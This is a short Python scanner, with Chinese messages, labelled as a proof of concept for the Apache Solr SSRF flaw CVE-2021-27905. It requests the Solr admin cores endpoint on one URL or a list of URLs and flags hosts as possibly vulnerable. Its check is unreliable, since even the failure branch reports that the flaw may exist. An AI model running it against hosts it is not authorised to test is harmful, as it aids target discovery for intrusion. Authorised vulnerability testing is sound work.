#coding=utf-8
#Apache solr SSRF
import sys
import requests
def solr_ssrf(url):
    req = requests.get(url)
    if "name" in req.text and int(req.status_code) <= 210:
        print("[+] " + url + " 可能存在SSRF!")
    else:
        print("可能存在，尝试手工验证!")
def solr_ssrfs(url):
    sess = requests.session()
    req = sess.get(url)
    if "name" in req.text and int(req.status_code) <= 210:
        print("[+] " + url + " 可能存在SSRF!")
    else:
        print("可能存在，尝试手工验证!")
if __name__ == '__main__':
    try:
        payload = 'solr/admin/cores?indexInfo=false&wt=json'
        url = sys.argv[1]
        if "http" in url:
            url = url + payload
            solr_ssrf(url)
        else:
            url = open(url,'r+')
            for i in url:
                url = i.rstrip('\n') + payload
                solr_ssrfs(url)
    except FileNotFoundError:
        print("找不到该url文件！")
    except IndexError:
        print("（CVE-2021-27905）Apache Solr SSRF")
        print('------------------------------------------------------------')
        print("使用说明： python poc.py 单个url/url文件")
        print('------------------------------------------------------------')



